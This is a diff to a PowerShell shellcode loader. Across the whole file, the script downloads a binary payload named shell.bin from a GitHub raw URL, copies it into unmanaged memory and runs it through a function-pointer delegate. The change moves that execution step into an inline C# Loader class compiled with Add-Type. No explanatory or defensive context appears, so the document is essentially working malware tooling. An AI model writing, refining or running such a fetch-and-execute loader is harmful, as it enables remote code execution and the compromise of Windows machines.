@@ -1,5 +1,21 @@
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class Loader {
+    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+    public delegate void ShellcodeDelegate();
+
+    public static void Run(byte[] sc) {
+        IntPtr ptr = Marshal.AllocHGlobal(sc.Length);
+        Marshal.Copy(sc, 0, ptr, sc.Length);
+        ShellcodeDelegate del = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(ptr, typeof(ShellcodeDelegate));
+        del();
+    }
+}
+"@
+
+Add-Type $code
+
 $sc = (New-Object Net.WebClient).DownloadData("https://github.com/HexagonFetish/hello/raw/refs/heads/main/shell.bin")
-$ptr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
-[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $ptr, $sc.Length)
-$func = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptr, (New-Object System.Func[Int32]))
-$func.Invoke(0)
+[Loader]::Run($sc)
